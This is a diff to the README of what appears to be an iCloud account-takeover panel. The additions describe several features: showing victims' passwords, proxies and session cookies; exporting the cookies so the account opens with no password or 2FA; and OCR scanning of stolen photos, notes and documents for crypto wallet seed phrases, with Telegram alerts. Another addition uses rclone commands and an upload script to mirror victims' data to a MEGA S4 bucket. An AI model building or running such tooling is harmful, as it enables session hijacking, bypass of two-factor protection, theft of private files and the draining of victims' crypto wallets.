@@ -212,6 +212,12 @@ validated with Zod and rate-limited per socket.
     same live check as **Recheck all**: verify live iCloud, auto-export any new
     photos/hidden/deleted/notes/drive/contacts/calendar/reminders, then scan.
     Telegram reports the changed areas and the tier breakdown of **new** seeds.
+11. **Photo URLs (no download).** With `EXPORT_ENABLED=false` the server stops
+    downloading photo bytes. The Overview button **Photo URLs** enumerates the
+    photo albums once and writes `Photos/urls.json` with each asset's signed
+    `downloadURL`; that link is a direct CDN URL and needs **no iCloud cookie**.
+    The signature lasts about 15 minutes, so regenerate before distributing it.
+    `Download URLs JSON` serves the file from the admin API.
 
 Sessions are backed up before a re-auth attempt and restored if it fails. The
 worker never calls `logout()` and never deletes cookies.
@@ -278,6 +284,11 @@ append-only log and also offers a compact account browser.
   **Hide** (with confirmation) soft-hides an account without deleting its
   session, export or files; the **Hidden** filter shows them again and
   **Unhide** restores. **Hide all** clears the visible list the same way.
+- **Manual connect** — per account, a modal shows the email, password, the
+  exact anyIP proxy (server, username, password, full URL) and the saved
+  iCloud cookies. **Copy cookies** / **Download** produce the Cookie-Editor
+  JSON; importing it in a browser lands on the iCloud dashboard with no
+  password and no 2FA.
 - **Recheck all** — verifies every visible trusted account against live
   iCloud and automatically runs `export missing` when new items are found.
   `NEW FILES n` and `NEW SEEDS n` badges appear for 10 minutes; the plain
@@ -291,12 +302,15 @@ append-only log and also offers a compact account browser.
 - **Live verify** — a worker job enumerates iCloud id-only and compares with
   `manifest.sqlite3`, showing `live / exported / missing` per area. Export
   missing downloads only the gap.
-- **Scan OCR + seeds** — RapidOCR reads image text (and notes/filenames),
-  writes `Scan/index.json` for search, `Scan/findings.json` for seeds and
+- **Scan OCR + seeds** — RapidOCR reads image text; plain text, JSON values,
+  `.ics`, `.vcf`, `.emlx`, `.mbox`, HTML/XML and the text of PDF, DOCX, XLSX,
+  PPTX, Pages and Numbers files are read too (PDF needs `pypdf`). It writes
+  `Scan/index.json` for search, `Scan/findings.json` for seeds and
   `Scan/thumbs/` previews. Tiers: 3–4 low (noisy short candidates), 5–7
   minimum, 8–11 medium, 12+ high; a valid BIP39 checksum on 12/15/18/21/24 is
-  marked `checksum valid` (checksum only, no balance lookup). Search shows the
-  **image**, with the OCR text only as a snippet.
+  marked `checksum valid` (checksum only, no balance lookup). Large JSON is
+  parsed before any truncation, and text files are read up to 32 MB. Search
+  shows the **image**, with the OCR text only as a snippet.
 
 Panel session settings: `ADMIN_SESSION_HOURS` (168), optional
 `ADMIN_SESSION_SECRET`, and `PANEL_URL` for the Telegram link.
@@ -440,11 +454,30 @@ ones:
 | `MAX_AUTH_JOBS` | `10` | concurrent logins |
 | `MAX_EXPORT_JOBS` | `16` | concurrent exports |
 | `MAX_SCAN_JOBS` | `2` | concurrent OCR/seed scans (separate from exports) |
+| `SCAN_WORKERS` | `min(8, CPUs)` | OCR worker **processes** per scan. Each decodes one image once and runs OCR independently; 0/unset = auto |
+| `SCAN_OCR_MAX` | `2200` | longest image side fed to OCR. Lower is faster: `1600` ≈ 20% faster, `1280` ≈ 35% faster |
+| `SCAN_OCR_CLS` | `1` | `0` skips the 180° text classifier (EXIF rotation is already applied); ~10% faster |
+| `SCAN_OCR_THREADS` | `1` (parallel) | ONNX threads per worker. Keep `1` when running several workers, or they fight over the CPU |
+| `MAX_VERIFY_JOBS` | `2` | concurrent live checks; each walks the whole photo/note/drive id space |
 | `MAX_QUEUE` | `500` | queued jobs before "busy" |
+| `EXPORT_ENABLED` | `false` | master switch for file downloads; `false` stops every export wave and manual download, while login, verify, counts and **Photo URLs** still work |
 | `AUTO_EXPORT_AFTER_AUTH` | `true` | start the resumable export as soon as login succeeds |
 | `AUTO_SCAN_AFTER_EXPORT` | `true` | start the OCR/seed scan automatically when an export finishes; the summary is posted to Telegram |
 | `EXPORT_DIR` | `./export` | export root |
+| `DRIVE_SKIP_EXT` | app/installer list | Drive extensions not downloaded (`.exe`, `.msi`, `.dmg`, `.pkg`, `.deb`, `.rpm`, `.apk`, `.ipa`, `.appimage`, `.app`, …). Photos and notes are never filtered. `none` disables it |
 | `SESSIONS_DIR` | `./sessions` | cookie/session root |
+| `S4_ENDPOINT` | empty | MEGA S4 / S3 endpoint; empty keeps the panel on local files |
+| `S4_REGION` | `eu-amsterdam-1` | SigV4 region |
+| `S4_BUCKET` | `icld` | bucket that mirrors the export |
+| `S4_KEY` / `S4_SECRET` | empty | S3 access key (never commit) |
+| `S4_TTL` | `43200` | signed URL lifetime, seconds |
+| `S4_URL_CACHE_MS` | `21600000` | keep the same signed URL for 6 h so the browser can cache the object |
+| `S4_REMOTE` | `s4:icld` | rclone remote + bucket for `python/s4_upload.py` |
+| `RCLONE_CONFIG` | `/root/.config/rclone/rclone.conf` | rclone config with the S4 remote |
+| `S4_UPLOAD` | `1` | watchdog starts the uploader |
+| `S4_PRUNE` | `1` | delete local Photos/Drive originals after a checked upload and scan |
+| `S4_SYNC_INTERVAL` | `300` | seconds between background mirror checks |
+| `S4_CHECKSUM` | `0` | `1` compares hashes before prune (slower, stricter than size-only) |
 | `KEEPALIVE_HOURS` | `5` | live check interval: verify the session, compare live iCloud, export new items |
 | `GATE_MODE` | unset | `db` (same server as redirect) or `http` (separate server) |
 | `GATE_DB_PATH` | empty | redirect's `data/gate.db`; page user must be able to write it |
@@ -458,6 +491,35 @@ ones:
 | `GATE_ADMIN_TOKEN` | empty | `/sign-in?gate=<token>` plants a page session |
 | `EDGE_PROXY` | `auto` | `cloudflare`, `nginx`, `none`, or `auto` |
 | `VITE_MOCK_AUTH` | unset | run the UI without a worker |
+
+## MEGA S4 pipeline
+
+The worker writes the export locally; `auto_unzip.py` extracts the bulk ZIPs;
+`s4_upload.py` mirrors the account to S4, writes `Scan/s4-manifest.json` and
+`Scan/s4-complete.json`, checks sizes, then optionally prunes `Photos/` and
+`Drive/` originals.  The panel asks `gallery`/`library` for `src`, `thumbSrc`,
+`previewSrc` and `playSrc`; when the account is complete those are direct
+signed S4 URLs, with the local `/api/admin/...` route as the fallback.
+
+```bash
+# once, as root
+rclone config create s4 s3 provider=Other \
+  endpoint="$S4_ENDPOINT" access_key_id="$S4_KEY" \
+  secret_access_key="$S4_SECRET" region="$S4_REGION"
+
+# one account, dry run first
+python3 python/s4_upload.py --email user@icloud.com --dry-run --no-prune
+python3 python/s4_upload.py --email user@icloud.com --prune
+
+# continuous (or let watchdog.py start it)
+python3 python/s4_upload.py --watch --prune
+```
+
+`S4_PRUNE` waits for `Scan/index.json` or `Scan/summary.json`, so OCR still
+runs on local files before the originals are removed.  `Scan/` (thumbs, OCR,
+manifests) stays local, which keeps the grid instant even after a prune.
+`watchdog.py` starts the uploader as root; a manual run as the service user
+needs `RCLONE_CONFIG` pointing at a config it can read.
 
 ## Compare against the reference
 
